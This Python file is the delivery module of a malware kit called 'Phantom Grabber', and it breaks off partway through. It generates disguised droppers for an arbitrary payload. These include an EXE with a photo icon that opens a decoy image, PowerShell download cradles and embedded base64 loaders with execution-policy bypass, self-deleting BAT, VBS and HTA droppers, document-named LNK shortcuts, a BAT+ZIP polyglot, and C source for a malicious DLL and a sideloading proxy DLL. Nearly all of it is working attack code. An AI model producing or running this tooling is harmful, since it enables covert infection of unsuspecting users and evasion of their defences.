# ═══════════════════════════════════════════════════════════════════════
# Phantom Grabber — Delivery Method Generators
# Wraps the built payload EXE in various delivery formats.
# ═══════════════════════════════════════════════════════════════════════

import os
import sys
import base64
import random
import string
import shutil
import struct
import subprocess
import tempfile
import textwrap
import logging
import zipfile

logger = logging.getLogger("Delivery")


class DeliveryGenerator:
    """Post-build delivery wrapper generator.

    Each method takes a built payload EXE and produces a delivery
    artifact (dropper, shortcut, disguised EXE, etc.) in the output dir.
    """

    # ── helpers ──────────────────────────────────────────────────────
    @staticmethod
    def _rand(n: int = 8) -> str:
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

    @staticmethod
    def _read(path: str) -> bytes:
        with open(path, "rb") as f:
            return f.read()

    @staticmethod
    def _b64(data: bytes) -> str:
        return base64.b64encode(data).decode("ascii")

    @staticmethod
    def _b64_lines(data: bytes, width: int = 76) -> list[str]:
        raw = base64.b64encode(data).decode("ascii")
        return [raw[i : i + width] for i in range(0, len(raw), width)]

    # ════════════════════════════════════════════════════════════════
    #  1 · IMAGE DISGUISE
    # ════════════════════════════════════════════════════════════════
    @classmethod
    def image_disguise(
        cls,
        payload_path: str,
        decoy_image_path: str,
        output_dir: str,
    ) -> dict:
        """EXE with photo icon — opens a real decoy image then runs the
        payload hidden.  Generates a wrapper .py + compile script.

        The wrapper uses sys._MEIPASS (PyInstaller) to locate the bundled
        decoy image and payload EXE at runtime.
        """
        os.makedirs(output_dir, exist_ok=True)

        decoy_ext = os.path.splitext(decoy_image_path)[1].lower() or ".jpg"
        decoy_basename = f"photo_{cls._rand(4)}{decoy_ext}"
        payload_basename = f"{cls._rand(8)}.exe"
        output_name = f"IMG_{cls._rand(5)}"

        # copy both files into the output dir so PyInstaller can find them
        decoy_copy = os.path.join(output_dir, decoy_basename)
        payload_copy = os.path.join(output_dir, payload_basename)
        shutil.copy2(decoy_image_path, decoy_copy)
        shutil.copy2(payload_path, payload_copy)

        # ── convert decoy to .ico for the EXE icon ──
        icon_path = os.path.join(output_dir, "disguise.ico")
        try:
            from PIL import Image
            img = Image.open(decoy_image_path)
            img.thumbnail((256, 256))
            img.save(
                icon_path,
                format="ICO",
                sizes=[(256, 256), (48, 48), (32, 32), (16, 16)],
            )
        except Exception:
            icon_path = None

        # ── generate the wrapper script ──
        wrapper_code = textwrap.dedent(f"""\
            import os, sys, subprocess

            def _run():
                base = sys._MEIPASS if hasattr(sys, '_MEIPASS') else os.path.dirname(__file__)
                decoy = os.path.join(base, '{decoy_basename}')
                payload = os.path.join(base, '{payload_basename}')
                if os.path.isfile(decoy):
                    os.startfile(decoy)
                if os.path.isfile(payload):
                    subprocess.Popen(
                        payload,
                        creationflags=0x08000000,
                        close_fds=True,
                    )

            if __name__ == '__main__':
                _run()
        """)
        wrapper_path = os.path.join(output_dir, "image_wrapper.py")
        with open(wrapper_path, "w", encoding="utf-8") as f:
            f.write(wrapper_code)

        # ── PyInstaller compile command ──
        pyi_args = [
            "pyinstaller",
            "--onefile",
            "--noconsole",
            "--clean",
            "--name", output_name,
            "--distpath", output_dir,
            f"--add-data={decoy_copy};.",
            f"--add-data={payload_copy};.",
        ]
        if icon_path and os.path.isfile(icon_path):
            pyi_args += ["--icon", icon_path]
        pyi_args.append(wrapper_path)

        compile_bat = os.path.join(output_dir, "compile_disguise.bat")
        with open(compile_bat, "w", newline="\r\n") as f:
            f.write("@echo off\r\n")
            f.write(f'cd /d "{output_dir}"\r\n')
            f.write(" ".join(pyi_args) + "\r\n")
            f.write("pause\r\n")

        # ── attempt auto-compile ──
        compiled = None
        try:
            r = subprocess.run(
                pyi_args, capture_output=True, text=True,
                timeout=180, cwd=output_dir,
            )
            if r.returncode == 0:
                candidate = os.path.join(output_dir, f"{output_name}.exe")
                if os.path.isfile(candidate):
                    compiled = candidate
        except Exception as exc:
            logger.warning(f"Auto-compile skipped: {exc}")

        return {
            "type": "image_disguise",
            "wrapper": wrapper_path,
            "compile_bat": compile_bat,
            "compiled": compiled,
            "notes": (
                f"Opens {decoy_basename} as decoy while running payload hidden."
                + (" Auto-compiled OK." if compiled else " Run compile_disguise.bat to build.")
            ),
        }

    # ════════════════════════════════════════════════════════════════
    #  2 · POWERSHELL ONE-LINER
    # ════════════════════════════════════════════════════════════════
    @classmethod
    def powershell_oneliner(
        cls,
        payload_path: str,
        output_dir: str,
        hosted_url: str | None = None,
    ) -> dict:
        """Fileless-ish PowerShell delivery.

        Generates three variants:
        1. **Embedded** — entire EXE base64-encoded inside the command
           (self-contained, very long).
        2. **Download cradle** — short one-liner that fetches the EXE
           from *hosted_url*.
        3. **EncodedCommand** — same as #1 but wrapped in -Enc.
        """
        os.makedirs(output_dir, exist_ok=True)

        payload_data = cls._read(payload_path)
        payload_b64 = cls._b64(payload_data)
        exe_name = f"{cls._rand(8)}.exe"

        # ── 1. embedded one-liner ──
        embedded_ps = (
            f"$d=[Convert]::FromBase64String('{payload_b64}');"
            f"$p=$env:temp+'\\{exe_name}';"
            f"[IO.File]::WriteAllBytes($p,$d);"
            f"Start-Process $p -WindowStyle Hidden"
        )
        embedded_cmd = (
            f'powershell -nop -w hidden -ep bypass -c "{embedded_ps}"'
        )

        # ── 2. download cradle ──
        url_placeholder = hosted_url or "<PASTE_HOSTED_URL_HERE>"
        cradle_ps = (
            f"$u='{url_placeholder}';"
            f"$p=$env:temp+'\\{exe_name}';"
            f"(New-Object Net.WebClient).DownloadFile($u,$p);"
            f"Start-Process $p -WindowStyle Hidden"
        )
        cradle_cmd = f'powershell -nop -w hidden -ep bypass -c "{cradle_ps}"'

        # ── 3. encoded-command variant ──
        enc_b64 = base64.b64encode(
            embedded_ps.encode("utf-16-le")
        ).decode("ascii")
        encoded_cmd = (
            f"powershell -nop -w hidden -ep bypass -EncodedCommand {enc_b64}"
        )

        # ── save everything ──
        txt_path = os.path.join(output_dir, "powershell_commands.txt")
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write("=== PHANTOM GRABBER — PowerShell Delivery ===\n\n")
            f.write(f"Payload: {len(payload_data):,} bytes "
                    f"({len(payload_b64):,} base64)\n\n")
            f.write("─── 1. EMBEDDED (self-contained, very long) ───\n\n")
            f.write(embedded_cmd + "\n\n")
            f.write("─── 2. DOWNLOAD CRADLE (host the EXE yourself) ───\n\n")
            f.write(cradle_cmd + "\n\n")
            f.write("─── 3. ENCODED COMMAND (base64-wrapped #1) ───\n\n")
            f.write(encoded_cmd + "\n\n")

        ps1_path = os.path.join(output_dir, "dropper.ps1")
        with open(ps1_path, "w", encoding="utf-8") as f:
            f.write("# Phantom Grabber — PS dropper\n")
            f.write(embedded_ps + "\n")

        return {
            "type": "powershell",
            "commands_file": txt_path,
            "ps1": ps1_path,
            "notes": f"3 variants saved. Payload {len(payload_data):,} bytes.",
        }

    # ════════════════════════════════════════════════════════════════
    #  3 · BAT DROPPER
    # ════════════════════════════════════════════════════════════════
    @classmethod
    def bat_dropper(cls, payload_path: str, output_dir: str) -> dict:
        """`.bat` that decodes an embedded base64 EXE via certutil,
        drops it to %temp%, runs it hidden, then self-deletes."""
        os.makedirs(output_dir, exist_ok=True)

        payload_data = cls._read(payload_path)
        b64_lines = cls._b64_lines(payload_data, width=76)

        exe_name = f"{cls._rand(8)}.exe"
        b64_tmp = f"~{cls._rand(4)}.b64"

        lines = [
            "@echo off",
            "setlocal enabledelayedexpansion",
            f'set "exe=%temp%\\{exe_name}"',
            f'set "b64=%temp%\\{b64_tmp}"',
            "",
            "(",
        ]
        for b in b64_lines:
            lines.append(f"echo {b}")
        lines += [
            f') > "%b64%"',
            "",
            'certutil -decode "%b64%" "%exe%" >nul 2>&1',
            'del /f /q "%b64%" >nul 2>&1',
            'start "" /b "%exe%"',
            "",
            ":: self-delete",
            '(goto) 2>nul & del "%~f0"',
        ]

        bat_name = f"dropper_{cls._rand(4)}.bat"
        bat_path = os.path.join(output_dir, bat_name)
        with open(bat_path, "w", newline="\r\n") as f:
            f.write("\r\n".join(lines))

        sz = os.path.getsize(bat_path)
        return {
            "type": "bat_dropper",
            "file": bat_path,
            "notes": f"BAT dropper {bat_name} ({sz:,} bytes). "
                     f"certutil decodes + runs, then self-deletes.",
        }

    # ════════════════════════════════════════════════════════════════
    #  4 · VBS DROPPER
    # ════════════════════════════════════════════════════════════════
    @classmethod
    def vbs_dropper(cls, payload_path: str, output_dir: str) -> dict:
        """`.vbs` that decodes base64 via MSXML2, writes to temp via
        ADODB.Stream, executes hidden, then self-deletes."""
        os.makedirs(output_dir, exist_ok=True)

        payload_b64 = cls._b64(cls._read(payload_path))
        chunk_sz = 800
        chunks = [
            payload_b64[i : i + chunk_sz]
            for i in range(0, len(payload_b64), chunk_sz)
        ]
        exe_name = f"{cls._rand(8)}.exe"

        lines = [
            "' Phantom Grabber VBS Dropper",
            "On Error Resume Next",
            "",
            "Dim b64, shell, path",
            'Set shell = CreateObject("WScript.Shell")',
            f'path = shell.ExpandEnvironmentStrings("%TEMP%") & "\\{exe_name}"',
            "",
            'b64 = ""',
        ]
        for c in chunks:
            lines.append(f'b64 = b64 & "{c}"')
        lines += [
            "",
            "' decode base64 → binary",
            'Dim xml, node',
            'Set xml = CreateObject("MSXML2.DOMDocument.3.0")',
            'Set node = xml.createElement("b64")',
            'node.DataType = "bin.base64"',
            "node.Text = b64",
            "",
            "' write binary to disk",
            'Dim stream',
            'Set stream = CreateObject("ADODB.Stream")',
            "stream.Type = 1",
            "stream.Open",
            "stream.Write node.nodeTypedValue",
            "stream.SaveToFile path, 2",
            "stream.Close",
            "",
            "' execute hidden (0 = vbHide)",
            'shell.Run Chr(34) & path & Chr(34), 0, False',
            "",
            "' self-delete after short delay",
            'Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")',
            "WScript.Sleep 1500",
            "fso.DeleteFile WScript.ScriptFullName, True",
        ]

        vbs_name = f"dropper_{cls._rand(4)}.vbs"
        vbs_path = os.path.join(output_dir, vbs_name)
        with open(vbs_path, "w", newline="\r\n") as f:
            f.write("\r\n".join(lines))

        sz = os.path.getsize(vbs_path)
        return {
            "type": "vbs_dropper",
            "file": vbs_path,
            "notes": f"VBS dropper {vbs_name} ({sz:,} bytes).",
        }

    # ════════════════════════════════════════════════════════════════
    #  5 · HTA DROPPER
    # ════════════════════════════════════════════════════════════════
    @classmethod
    def hta_dropper(cls, payload_path: str, output_dir: str) -> dict:
        """`.hta` — HTML Application that decodes + runs the payload,
        then closes itself."""
        os.makedirs(output_dir, exist_ok=True)

        payload_b64 = cls._b64(cls._read(payload_path))
        chunk_sz = 800
        chunks = [
            payload_b64[i : i + chunk_sz]
            for i in range(0, len(payload_b64), chunk_sz)
        ]
        exe_name = f"{cls._rand(8)}.exe"

        b64_assignments = 'b64 = ""\n'
        for c in chunks:
            b64_assignments += f'b64 = b64 & "{c}"\n'

        hta = textwrap.dedent(f"""\
            <html>
            <head>
            <title>Please wait...</title>
            <HTA:APPLICATION
                ID="PhantomHTA"
                BORDER="none"
                SHOWINTASKBAR="no"
                CAPTION="no"
                WINDOWSTATE="minimize"
                SCROLL="no"
                SINGLEINSTANCE="yes"
            />
            </head>
            <body>
            <script language="VBScript">
            On Error Resume Next

            Dim b64, shell, path
            Set shell = CreateObject("WScript.Shell")
            path = shell.ExpandEnvironmentStrings("%TEMP%") & "\\{exe_name}"

            {b64_assignments}

            Dim xml, node
            Set xml = CreateObject("MSXML2.DOMDocument.3.0")
            Set node = xml.createElement("b64")
            node.DataType = "bin.base64"
            node.Text = b64

            Dim stream
            Set stream = CreateObject("ADODB.Stream")
            stream.Type = 1
            stream.Open
            stream.Write node.nodeTypedValue
            stream.SaveToFile path, 2
            stream.Close

            shell.Run Chr(34) & path & Chr(34), 0, False

            window.setTimeout "window.close", 800
            </script>
            </body>
            </html>
        """)

        hta_name = f"document_{cls._rand(4)}.hta"
        hta_path = os.path.join(output_dir, hta_name)
        with open(hta_path, "w", newline="\r\n") as f:
            f.write(hta)

        sz = os.path.getsize(hta_path)
        return {
            "type": "hta_dropper",
            "file": hta_path,
            "notes": f"HTA dropper {hta_name} ({sz:,} bytes). "
                     f"Double-click to run; window auto-closes.",
        }

    # ════════════════════════════════════════════════════════════════
    #  6 · LNK SHORTCUT
    # ════════════════════════════════════════════════════════════════
    @classmethod
    def lnk_shortcut(
        cls,
        payload_path: str,
        output_dir: str,
        hosted_url: str | None = None,
    ) -> dict:
        """Windows .lnk shortcut that runs a PowerShell download-cradle
        or embedded dropper when double-clicked.

        Uses WScript.Shell COM to create the .lnk via PowerShell.
        """
        os.makedirs(output_dir, exist_ok=True)

        exe_name = f"{cls._rand(8)}.exe"

        if hosted_url:
            ps_inner = (
                f"(New-Object Net.WebClient).DownloadFile("
                f"'{hosted_url}','$env:temp\\{exe_name}');"
                f"Start-Process '$env:temp\\{exe_name}' -WindowStyle Hidden"
            )
        else:
            payload_b64 = cls._b64(cls._read(payload_path))
            ps_inner = (
                f"$d=[Convert]::FromBase64String('{payload_b64}');"
                f"$p=$env:temp+'\\{exe_name}';"
                f"[IO.File]::WriteAllBytes($p,$d);"
                f"Start-Process $p -WindowStyle Hidden"
            )

        ps_args = (
            "-nop -w hidden -ep bypass -c \""
            + ps_inner.replace('"', '`"')
            + '"'
        )

        lnk_name = f"Document_{cls._rand(4)}.lnk"
        lnk_path = os.path.join(output_dir, lnk_name)
        lnk_escaped = lnk_path.replace("\\", "\\\\")
        ps_args_escaped = ps_args.replace("'", "''")

        ps_create = (
            f"$ws = New-Object -ComObject WScript.Shell; "
            f"$s = $ws.CreateShortcut('{lnk_escaped}'); "
            f"$s.TargetPath = 'powershell.exe'; "
            f"$s.Arguments = '{ps_args_escaped}'; "
            f"$s.WindowStyle = 7; "
            f"$s.IconLocation = 'shell32.dll,1'; "
            f"$s.Description = 'Open document'; "
            f"$s.Save()"
        )

        try:
            r = subprocess.run(
                ["powershell", "-nop", "-c", ps_create],
                capture_output=True, text=True, timeout=30,
            )
            if r.returncode == 0 and os.path.isfile(lnk_path):
                return {
                    "type": "lnk_shortcut",
                    "file": lnk_path,
                    "notes": f"LNK shortcut {lnk_name} created.",
                }
        except Exception as exc:
            logger.warning(f"LNK COM creation failed: {exc}")

        # fallback — save the .ps1 for manual creation
        fallback = os.path.join(output_dir, "create_lnk.ps1")
        with open(fallback, "w", encoding="utf-8") as f:
            f.write("# Run this to create the LNK\n")
            f.write(ps_create.replace("; ", "\n") + "\n")
        return {
            "type": "lnk_shortcut",
            "file": fallback,
            "notes": "COM failed — run create_lnk.ps1 manually.",
        }

    # ════════════════════════════════════════════════════════════════
    #  7 · SELF-EXTRACTING ZIP  (BAT + ZIP polyglot)
    # ════════════════════════════════════════════════════════════════
    @classmethod
    def sfx_archive(cls, payload_path: str, output_dir: str) -> dict:
        """BAT-ZIP polyglot: a batch header that extracts itself via
        PowerShell Expand-Archive and runs the payload."""
        os.makedirs(output_dir, exist_ok=True)

        payload_name = os.path.basename(payload_path)
        if not payload_name.lower().endswith(".exe"):
            payload_name += ".exe"

        sfx_tag = f"sfx_{cls._rand(4)}"

        # ── create inner zip ──
        zip_tmp = os.path.join(output_dir, f"~{sfx_tag}.zip")
        with zipfile.ZipFile(zip_tmp, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.write(payload_path, payload_name)
        with open(zip_tmp, "rb") as f:
            zip_data = f.read()
        os.remove(zip_tmp)

        # ── bat header ──
        bat_header = textwrap.dedent(f"""\
            @echo off
            setlocal
            set "d=%temp%\\{sfx_tag}"
            mkdir "%d%" 2>nul
            copy /b "%~f0" "%d%\\a.zip" >nul
            powershell -nop -c "Expand-Archive -Path '%d%\\a.zip' -Dest '%d%' -Force" 2>nul
            if exist "%d%\\{payload_name}" start "" /b "%d%\\{payload_name}"
            del "%d%\\a.zip" >nul 2>&1
            (goto) 2>nul & del "%~f0"

        """).encode("ascii")

        sfx_name = f"package_{cls._rand(4)}.bat"
        sfx_path = os.path.join(output_dir, sfx_name)
        with open(sfx_path, "wb") as f:
            f.write(bat_header)
            f.write(zip_data)

        sz = os.path.getsize(sfx_path)
        return {
            "type": "sfx_archive",
            "file": sfx_path,
            "notes": f"Self-extracting BAT+ZIP {sfx_name} ({sz:,} bytes).",
        }

    # ════════════════════════════════════════════════════════════════
    #  8 · DLL CREATE
    # ════════════════════════════════════════════════════════════════

    # Common hijackable DLL export tables (fallback when no target DLL given)
    _PRESET_EXPORTS: dict[str, list[str]] = {
        "version.dll": [
            "GetFileVersionInfoA", "GetFileVersionInfoByHandle",
            "GetFileVersionInfoExA", "GetFileVersionInfoExW",
            "GetFileVersionInfoSizeA", "GetFileVersionInfoSizeExA",
            "GetFileVersionInfoSizeExW", "GetFileVersionInfoSizeW",
            "GetFileVersionInfoW", "VerFindFileA", "VerFindFileW",
            "VerInstallFileA", "VerInstallFileW", "VerLanguageNameA",
            "VerLanguageNameW", "VerQueryValueA", "VerQueryValueW",
        ],
        "winhttp.dll": [
            "WinHttpAddRequestHeaders", "WinHttpCheckPlatform",
            "WinHttpCloseHandle", "WinHttpConnect", "WinHttpCrackUrl",
            "WinHttpCreateProxyResolver", "WinHttpCreateUrl",
            "WinHttpDetectAutoProxyConfigUrl", "WinHttpFreeProxyResult",
            "WinHttpGetDefaultProxyConfiguration", "WinHttpGetIEProxyConfigForCurrentUser",
            "WinHttpGetProxyForUrl", "WinHttpGetProxyForUrlEx",
            "WinHttpOpen", "WinHttpOpenRequest", "WinHttpQueryAuthSchemes",
            "WinHttpQueryDataAvailable", "WinHttpQueryHeaders",
            "WinHttpQueryOption", "WinHttpReadData", "WinHttpReceiveResponse",
            "WinHttpSendRequest", "WinHttpSetCredentials",
            "WinHttpSetDefaultProxyConfiguration", "WinHttpSetOption",
            "WinHttpSetStatusCallback", "WinHttpSetTimeouts",
            "WinHttpWriteData",
        ],
        "winmm.dll": [
            "PlaySoundA", "PlaySoundW", "waveOutOpen", "waveOutClose",
            "waveOutWrite", "waveOutPause", "waveOutRestart",
            "waveOutReset", "waveOutGetVolume", "waveOutSetVolume",
            "waveOutGetDevCapsA", "waveOutGetNumDevs",
            "timeGetTime", "timeBeginPeriod", "timeEndPeriod",
            "mciSendCommandA", "mciSendStringA",
        ],
        "dbghelp.dll": [
            "MiniDumpWriteDump", "SymInitialize", "SymCleanup",
            "SymGetOptions", "SymSetOptions", "SymLoadModuleEx",
            "SymUnloadModule64", "SymGetSymFromAddr64",
            "SymGetLineFromAddr64", "StackWalk64", "UnDecorateSymbolName",
        ],
        "cryptsp.dll": [
            "CryptAcquireContextA", "CryptAcquireContextW",
            "CryptCreateHash", "CryptDecrypt", "CryptDeriveKey",
            "CryptDestroyHash", "CryptDestroyKey", "CryptEncrypt",
            "CryptExportKey", "CryptGenKey", "CryptGenRandom",
            "CryptGetHashParam", "CryptGetKeyParam", "CryptGetProvParam",
            "CryptHashData", "CryptImportKey", "CryptReleaseContext",
            "CryptSetKeyParam", "CryptSetProvParam", "CryptSignHashA",
            "CryptVerifySignatureA",
        ],
    }

    @classmethod
    def _get_dll_exports(cls, dll_path: str) -> list[str]:
        """Extract exported function names from a DLL.

        Tries dumpbin (MSVC), then objdump (MinGW), then pefile,
        then falls back to the preset table keyed by DLL filename.
        """
        dll_name = os.path.basename(dll_path).lower()
        exports: list[str] = []

        # ── dumpbin ──
        try:
            r = subprocess.run(
                ["dumpbin", "/exports", dll_path],
                capture_output=True, text=True, timeout=20,
            )
            if r.returncode == 0:
                for line in r.stdout.splitlines():
                    parts = line.split()
                    # dumpbin lines: ordinal  hint  RVA  name
                    if len(parts) >= 4 and parts[0].isdigit():
                        name = parts[-1]
                        if name.isidentifier():
                            exports.append(name)
                if exports:
                    logger.info(f"dumpbin extracted {len(exports)} exports from {dll_name}")
                    return exports
        except Exception:
            pass

        # ── objdump ──
        try:
            r = subprocess.run(
                ["objdump", "-p", dll_path],
                capture_output=True, text=True, timeout=20,
            )
            if r.returncode == 0:
                in_exports = False
                for line in r.stdout.splitlines():
                    if "[Ordinal/Name Pointer] Table" in line:
                        in_exports = True
                        continue
                    if in_exports:
                        stripped = line.strip()
                        if stripped.startswith("["):
                            name = stripped.split("]", 1)[-1].strip()
                            if name and name.isidentifier():
                                exports.append(name)
                        elif stripped == "" or stripped.startswith("The "):
                            break
                if exports:
                    logger.info(f"objdump extracted {len(exports)} exports from {dll_name}")
                    return exports
        except Exception:
            pass

        # ── pefile ──
        try:
            import pefile  # type: ignore
            pe = pefile.PE(dll_path, fast_load=True)
            pe.parse_data_directories(
                directories=[pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_EXPORT"]]
            )
            if hasattr(pe, "DIRECTORY_ENTRY_EXPORT"):
                for sym in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                    if sym.name:
                        exports.append(sym.name.decode("ascii", errors="replace"))
            pe.close()
            if exports:
                logger.info(f"pefile extracted {len(exports)} exports from {dll_name}")
                return exports
        except Exception:
            pass

        # ── preset fallback ──
        for key, names in cls._PRESET_EXPORTS.items():
            if dll_name.endswith(key):
                logger.info(f"Using preset exports for {key} ({len(names)} entries)")
                return names

        logger.warning(f"Could not extract exports from {dll_name} — using empty list")
        return []

    # ── DLL C source helpers ──────────────────────────────────────────

    _DLL_DROP_EXEC_C = textwrap.dedent("""\
        /* Phantom Grabber — DLL payload dropper (auto-generated) */
        #define WIN32_LEAN_AND_MEAN
        #include <windows.h>
        #include <wincrypt.h>
        #pragma comment(lib, "crypt32.lib")
        #pragma comment(lib, "kernel32.lib")

        /* ── embedded payload (base64) ─────────────────────────────── */
        static const char g_b64[] =
        %%B64_CHUNKS%%;

        /* NOTE: All heavy work runs in a worker thread spawned from DllMain.
           Calling CryptStringToBinaryA or CreateProcess directly inside
           DllMain risks deadlock under the loader lock.  CreateThread is
           explicitly safe to call from DllMain; the new thread runs after
           the loader lock is released, so no deadlock is possible.        */

        static DWORD WINAPI _PayloadThread(LPVOID lpParam) {
            (void)lpParam;

            DWORD cb = 0;
            if (!CryptStringToBinaryA(g_b64, 0, CRYPT_STRING_BASE64,
                                       NULL, &cb, NULL, NULL))
                return 1;

            BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, cb);
            if (!buf) return 1;

            if (!CryptStringToBinaryA(g_b64, 0, CRYPT_STRING_BASE64,
                                       buf, &cb, NULL, NULL)) {
                HeapFree(GetProcessHeap(), 0, buf);
                return 1;
            }

            char tmp[MAX_PATH], exe[MAX_PATH];
            GetTempPathA(MAX_PATH, tmp);
            SYSTEMTIME st;
            GetSystemTime(&st);
            wsprintfA(exe + lstrlenA(lstrcpyA(exe, tmp)),
                      "%04X%04X%04X.exe",
                      (DWORD)GetCurrentProcessId(),
                      (DWORD)st.wMilliseconds,
                      (DWORD)st.wSecond);

            HANDLE hf = CreateFileA(exe, GENERIC_WRITE, 0, NULL,
                                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hf == INVALID_HANDLE_VALUE) {
                HeapFree(GetProcessHeap(), 0, buf);
                return 1;
            }
            DWORD written;
            WriteFile(hf, buf, cb, &written, NULL);
            CloseHandle(hf);
            HeapFree(GetProcessHeap(), 0, buf);

            STARTUPINFOA si = {0};
            si.cb          = sizeof(si);
            si.dwFlags     = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            PROCESS_INFORMATION pi = {0};
            CreateProcessA(exe, NULL, NULL, NULL, FALSE,
                           CREATE_NO_WINDOW | DETACHED_PROCESS,
                           NULL, NULL, &si, &pi);
            return 0;
        }

        /* Spawn worker thread — safe to call from DllMain context. */
        static void ThreadedExec(void) {
            HANDLE ht = CreateThread(NULL, 0, _PayloadThread, NULL, 0, NULL);
            if (ht) CloseHandle(ht);
        }
    """)

    @classmethod
    def _b64_c_chunks(cls, data: bytes, width: int = 72) -> str:
        """Return base64-encoded bytes as adjacent C string literal chunks."""
        raw = base64.b64encode(data).decode("ascii")
        lines = [f'    "{raw[i:i+width]}"' for i in range(0, len(raw), width)]
        return "\n".join(lines)

    @classmethod
    def dll_create(
        cls,
        payload_path: str,
        output_dir: str,
        dll_name: str | None = None,
    ) -> dict:
        """Generate a standalone malicious DLL that drops + executes the payload.

        The DLL fires on any load event (DLL_PROCESS_ATTACH) and exports:
          - DllRegisterServer / DllUnregisterServer  →  regsvr32 compatible
          - DllInstall                               →  regsvr32 /i compatible
          - Exec                                     →  rundll32 compatible

        Produces:
          phantom_dll.c    — C source with embedded payload
          phantom_dll.def  — MSVC module-definition file
          compile.bat      — tries MinGW-w64 then MSVC cl.exe
          <dll_name>.dll   — compiled artifact (if toolchain found)
        """
        os.makedirs(output_dir, exist_ok=True)

        out_dll_name = dll_name or f"phantom_{cls._rand(5)}.dll"
        if not out_dll_name.lower().endswith(".dll"):
            out_dll_name += ".dll"
        dll_stem = os.path.splitext(out_dll_name)[0]

        payload_data = cls._read(payload_path)
        b64_chunks = cls._b64_c_chunks(payload_data)

        # ── C source ──
        drop_body = cls._DLL_DROP_EXEC_C.replace("%%B64_CHUNKS%%", b64_chunks)

        exports_block = textwrap.dedent("""
            /* ── exports ──────────────────────────────────────────────── */
            __declspec(dllexport) HRESULT WINAPI DllRegisterServer(void)   { ThreadedExec(); return S_OK; }
            __declspec(dllexport) HRESULT WINAPI DllUnregisterServer(void) { return S_OK; }
            __declspec(dllexport) HRESULT WINAPI DllInstall(
                BOOL bInstall, LPCWSTR pszCmdLine)                         { ThreadedExec(); return S_OK; }
            __declspec(dllexport) void           Exec(void)                { ThreadedExec(); }

            BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved) {
                (void)reserved;
                if (reason == DLL_PROCESS_ATTACH) {
                    DisableThreadLibraryCalls(hInst);
                    ThreadedExec();  /* safe: CreateThread is loader-lock-safe */
                }
                return TRUE;
            }
        """)

        c_source = drop_body + exports_block
        c_path = os.path.join(output_dir, f"{dll_stem}.c")
        with open(c_path, "w", encoding="utf-8", newline="\n") as f:
            f.write(c_source)

        # ── .def file ──
        def_content = textwrap.dedent(f"""\
            LIBRARY {out_dll_name}
            EXPORTS
                DllRegisterServer   @1
                DllUnregisterServer @2
                DllInstall          @3
                Exec                @4
        """)
        def_path = os.path.join(output_dir, f"{dll_stem}.def")
        with open(def_path, "w", encoding="utf-8", newline="\n") as f:
            f.write(def_content)

        dll_out = os.path.join(output_dir, out_dll_name)

        bat_lines = [
            "@echo off",
            f'cd /d "{output_dir}"',
            "",
            ":: ── Try MinGW-w64 ───────────────────────────────────────────",
            f'x86_64-w64-mingw32-gcc -shared -O2 -s -o "{out_dll_name}" '
            f'"{dll_stem}.c" "{dll_stem}.def" '
            f'-lkernel32 -ladvapi32 -lcrypt32 2>nul',
            f'if exist "{out_dll_name}" (',
            f'    echo [+] MinGW compiled: {out_dll_name}',
            f'    goto :done',
            f')',
            "",
            ":: ── Try MSVC cl.exe ─────────────────────────────────────────",
            f'cl.exe /LD /O2 /Fe:"{out_dll_name}" "{dll_stem}.c" '
            f'/link /DEF:"{dll_stem}.def" '
            f'kernel32.lib advapi32.lib crypt32.lib 2>nul',
            f'if exist "{out_dll_name}" (',
            f'    echo [+] MSVC compiled: {out_dll_name}',
            f'    goto :done',
            f')',
            "",
            "echo [-] Compilation failed. Install MinGW-w64 or run from MSVC Developer Prompt.",
            "",
            ":done",
            "pause",
        ]
        bat_path = os.path.join(output_dir, "compile.bat")
        with open(bat_path, "w", newline="\r\n") as f:
            f.write("\r\n".join(bat_lines))

        # ── attempt auto-compile ──
        compiled = None
        for compiler_args in [
            [
                "x86_64-w64-mingw32-gcc", "-shared", "-O2", "-s",
                "-o", dll_out, c_path, def_path,
                "-lkernel32", "-ladvapi32", "-lcrypt32",
            ],
            [
                "cl.exe", "/LD", "/O2", f"/Fe:{dll_out}", c_path,
                "/link", f"/DEF:{def_path}",
                "kernel32.lib", "advapi32.lib", "crypt32.lib",
            ],
        ]:
            try:
                r = subprocess.run(
                    compiler_args, capture_output=True, text=True,
                    timeout=60, cwd=output_dir,
                )
                if r.returncode == 0 and os.path.isfile(dll_out):
                    compiled = dll_out
                    logger.info(f"DLL compiled OK: {dll_out}")
                    break
            except FileNotFoundError:
                pass
            except Exception as exc:
                logger.warning(f"Compile attempt failed: {exc}")

        sz_payload = len(payload_data)
        notes = (
            f"DLL source: {dll_stem}.c | payload embedded: {sz_payload:,} bytes. "
            f"Exports: DllRegisterServer, DllUnregisterServer, DllInstall, Exec. "
            f"Deploy via: regsvr32 {out_dll_name}  or  rundll32 {out_dll_name},Exec"
            + (" | Auto-compiled OK." if compiled else " | Run compile.bat to build (needs MinGW or MSVC).")
        )

        return {
            "type": "dll_create",
            "c_source": c_path,
            "def_file": def_path,
            "compile_bat": bat_path,
            "compiled": compiled,
            "dll_name": out_dll_name,
            "notes": notes,
        }

    # ════════════════════════════════════════════════════════════════
    #  9 · DLL SIDELOAD (PROXY)
    # ════════════════════════════════════════════════════════════════
    @classmethod
    def dll_sideload(
        cls,
        payload_path: str,
        output_dir: str,
        target_dll: str | None = None,
        dll_name: str | None = None,
    ) -> dict:
        """Generate a proxy DLL for DLL hijacking / sideloading.

        The proxy DLL:
          - Exports every function from the original DLL, forwarding
            each call to the renamed original (orig_<name>.dll).
          - Drops + executes the payload once on DLL_PROCESS_ATTACH.

        Deployment:
          1. Rename original DLL to  orig_<name>.dll  in same directory.
          2. Drop the proxy DLL in its place.
          3. When the vulnerable application loads the DLL the payload fires.

        If *target_dll* is a path to the real DLL, exports are extracted
        automatically.  Otherwise the *dll_name* is matched against built-in
        presets (version.dll, winhttp.dll, winmm.dll, dbghelp.dll,
        cryptsp.dll).  Falls back to version.dll exports.

        Produces:
          proxy.c        — proxy DLL C source
          proxy.def      — MSVC module-definition with forwarded exports
